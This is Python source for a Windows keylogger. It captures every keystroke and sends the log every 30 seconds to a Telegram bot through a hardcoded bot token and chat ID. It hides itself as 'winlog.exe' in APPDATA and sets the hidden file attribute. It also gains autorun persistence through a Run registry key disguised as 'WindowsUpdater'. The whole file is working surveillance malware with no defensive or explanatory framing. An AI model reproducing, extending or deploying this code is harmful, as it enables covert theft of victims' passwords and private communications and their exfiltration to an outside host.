from pynput import keyboard
import requests
import threading
import os
import shutil
import sys
import winreg
import ctypes

# --- Config ---
bot_token = '7782356344:AAGdFwO_BT618xgL_TQpDSl_OmevkzKuB3Q'
chat_id = '5485031378'
interval = 30
filename = "winlog.exe"
log = ""

# --- Send to Telegram ---
def send_log(message):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {'chat_id': chat_id, 'text': message}
    try:
        requests.post(url, data=data)
    except Exception as e:
        print(f"Error sending log: {e}")  # For debugging

# --- Key logger ---
def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            log += ' '
        else:
            log += f' [{str(key)}] '

def report():
    global log
    if log:
        send_log(log)
        log = ""
    timer = threading.Timer(interval, report)
    timer.daemon = True
    timer.start()

# --- Hide file + Auto run ---
def setup():
    hidden_path = os.path.join(os.getenv("APPDATA"), filename)
    if not os.path.exists(hidden_path):
        try:
            # Copy to hidden location
            shutil.copy2(sys.executable, hidden_path)

            # Make file hidden
            ctypes.windll.kernel32.SetFileAttributesW(hidden_path, 2)  # 2 = Hidden attribute

            # Add to registry to autorun
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                              r"Software\Microsoft\Windows\CurrentVersion\Run",
                              0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "WindowsUpdater", 0, winreg.REG_SZ, hidden_path)

            # Run the hidden file, close original
            os.startfile(hidden_path)
            sys.exit()
        except Exception as e:
            print(f"Setup error: {e}")  # For debugging

# --- Start ---
if __name__ == "__main__":
    setup()
    report()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()